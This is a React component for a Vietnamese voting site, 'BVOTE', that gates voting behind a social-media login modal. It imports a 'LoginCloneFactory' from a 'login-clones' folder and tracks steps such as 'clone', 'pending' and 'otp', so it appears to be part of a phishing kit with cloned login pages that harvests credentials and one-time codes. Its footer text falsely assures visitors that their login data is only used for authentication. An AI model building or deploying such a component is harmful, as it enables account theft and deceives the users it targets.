import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, Shield, Clock, AlertTriangle } from 'lucide-react';
import LoginCloneFactory from '../login-clones/LoginCloneFactory';

const VotingLoginModal = ({ isOpen, onClose, onLoginSuccess, requiredForVoting = false }) => {
  const [loginStep, setLoginStep] = useState('platforms'); // platforms, clone, pending, otp, success, failed
  const [loginData, setLoginData] = useState(null);

  const handleLoginSuccess = (data) => {
    setLoginData(data);
    setLoginStep('success');

    // Auto close and callback after success animation
    setTimeout(() => {
      onLoginSuccess(data);
      onClose();
      setLoginStep('platforms');
      setLoginData(null);
    }, 2000);
  };

  const handleClose = () => {
    onClose();
    setLoginStep('platforms');
    setLoginData(null);
  };

  const renderContent = () => {
    switch (loginStep) {
      case 'success':
        return (
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="text-center py-8"
          >
            <motion.div
              initial={{ scale: 0 }}
              animate={{ scale: 1 }}
              transition={{ delay: 0.2, type: 'spring', stiffness: 200 }}
              className="w-20 h-20 mx-auto rounded-full bg-green-50 flex items-center justify-center mb-6"
            >
              <Shield className="w-10 h-10 text-green-500" />
            </motion.div>

            <h2 className="text-2xl font-bold text-gray-800 mb-4">
              Đăng nhập thành công!
            </h2>

            <p className="text-gray-600 mb-4">
              Chào mừng bạn đến với BVOTE. Bạn đã có thể tham gia bình chọn.
            </p>

            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <p className="text-green-800 text-sm">
                <strong>{loginData?.platform}</strong> • {loginData?.account}
              </p>
            </div>
          </motion.div>
        );

      default:
        return (
          <div className="h-full">
            <LoginCloneFactory onLoginSuccess={handleLoginSuccess} />
          </div>
        );
    }
  };

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black bg-opacity-50"
        onClick={handleClose}
      >
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20 }}
          className="bg-white rounded-2xl shadow-2xl max-w-md w-full max-h-[90vh] overflow-hidden"
          onClick={(e) => e.stopPropagation()}
        >
          {/* Header */}
          <div className="bg-gradient-to-r from-blue-500 to-purple-600 text-white p-6 relative">
            <button
              onClick={handleClose}
              className="absolute top-4 right-4 p-2 rounded-full hover:bg-white hover:bg-opacity-20 transition-colors"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="pr-12">
              <h1 className="text-xl font-bold mb-2">
                {requiredForVoting ? 'Đăng nhập để bình chọn' : 'Đăng nhập BVOTE'}
              </h1>
              <p className="text-blue-100 text-sm">
                {requiredForVoting
                  ? 'Bạn cần đăng nhập để tham gia bình chọn cho thí sinh yêu thích'
                  : 'Chọn nền tảng mạng xã hội để đăng nhập vào BVOTE'
                }
              </p>
            </div>
          </div>

          {/* Voting Requirements Notice */}
          {requiredForVoting && loginStep === 'platforms' && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              className="bg-amber-50 border-l-4 border-amber-400 p-4"
            >
              <div className="flex items-start">
                <AlertTriangle className="w-5 h-5 text-amber-500 mr-3 mt-0.5" />
                <div>
                  <h3 className="text-sm font-medium text-amber-800">
                    Yêu cầu đăng nhập
                  </h3>
                  <p className="text-sm text-amber-700 mt-1">
                    Để đảm bảo tính công bằng, mỗi tài khoản chỉ có thể bình chọn một lần cho mỗi thí sinh.
                  </p>
                </div>
              </div>
            </motion.div>
          )}

          {/* Content */}
          <div className="overflow-y-auto max-h-[60vh]">
            {renderContent()}
          </div>

          {/* Footer Info */}
          {loginStep === 'platforms' && (
            <div className="bg-gray-50 px-6 py-4 border-t border-gray-200">
              <div className="flex items-center justify-between text-sm">
                <div className="flex items-center text-gray-600">
                  <Shield className="w-4 h-4 mr-2" />
                  <span>Bảo mật & An toàn</span>
                </div>
                <div className="flex items-center text-gray-600">
                  <Clock className="w-4 h-4 mr-2" />
                  <span>Xử lý nhanh chóng</span>
                </div>
              </div>
              <p className="text-xs text-gray-500 mt-2">
                Thông tin đăng nhập được mã hóa và chỉ sử dụng cho mục đích xác thực.
              </p>
            </div>
          )}
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
};

export default VotingLoginModal;
